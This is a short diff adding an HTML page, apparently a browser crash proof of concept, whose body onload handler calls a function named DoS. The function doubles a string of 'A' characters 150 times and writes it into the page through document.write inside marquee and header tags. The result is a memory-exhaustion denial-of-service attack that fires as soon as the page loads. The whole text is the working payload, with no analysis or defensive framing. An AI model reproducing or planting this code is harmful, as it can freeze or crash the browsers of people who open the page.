@@ -1,0 +1,16 @@
+&lt;body onload=&quot;javascript:DoS();&quot;&gt;&lt;/body&gt;
+ 
+&lt;script&gt;
+ 
+function DoS() {
+ 
+var buffer = &#039;A&#039;;
+for (i =0;i&lt;150;i++) {
+buffer+=buffer+&#039;A&#039;;
+document.write(&#039;&lt;html&gt;&lt;marquee&gt;&lt;h1&gt;&#039;+buffer+buffer);
+}
+ 
+}
+ 
+&lt;/script&gt;
+
